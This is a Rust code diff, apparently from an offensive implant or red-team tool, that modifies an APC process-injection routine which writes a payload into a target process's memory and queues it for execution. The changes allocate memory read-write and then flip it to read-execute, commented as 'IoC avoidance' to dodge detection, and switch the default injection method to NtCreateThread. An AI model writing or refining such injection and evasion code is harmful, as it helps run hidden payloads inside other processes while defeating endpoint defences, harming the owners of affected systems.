@@ -940,14 +940,14 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
+    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
     use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
     use winapi::um::tlhelp32::{
         CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
     };
     use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-        THREAD_SET_CONTEXT,
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
+        PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
     };
 
     unsafe {
@@ -960,12 +960,13 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             ));
         }
 
+        // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
         let remote_mem = VirtualAllocEx(
             hprocess,
             std::ptr::null_mut(),
             payload.len(),
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         );
         if remote_mem.is_null() {
             pe_resolve::close_handle(hprocess);
@@ -989,6 +990,25 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
                 "apc_inject: WriteProcessMemory(pid={}) failed",
                 pid
             ));
+        }
+
+        // Flip from RW to RX — no write permission at execution time.
+        let mut old_protect = 0u32;
+        if VirtualProtectEx(
+            hprocess,
+            remote_mem,
+            payload.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        ) == 0
+        {
+            log::warn!(
+                "apc_inject: VirtualProtectEx to RX failed for pid={}, memory remains RW (not executable)",
+                pid
+            );
+            // Continue anyway — the payload won't execute if the page isn't
+            // executable, but at least we don't leak RWX pages.  The APC
+            // simply won't fire successfully.
         }
         pe_resolve::close_handle(hprocess);
 
@@ -1048,7 +1068,7 @@ pub fn select_and_inject(
     payload: &[u8],
     method: Option<InjectionMethod>,
 ) -> anyhow::Result<()> {
-    let method = method.unwrap_or(InjectionMethod::ThreadHijack);
+    let method = method.unwrap_or(InjectionMethod::NtCreateThread);
     log::info!("Dispatching injection using method: {:?}", method);
     crate::injection::inject_with_method(method, pid, payload)
 }
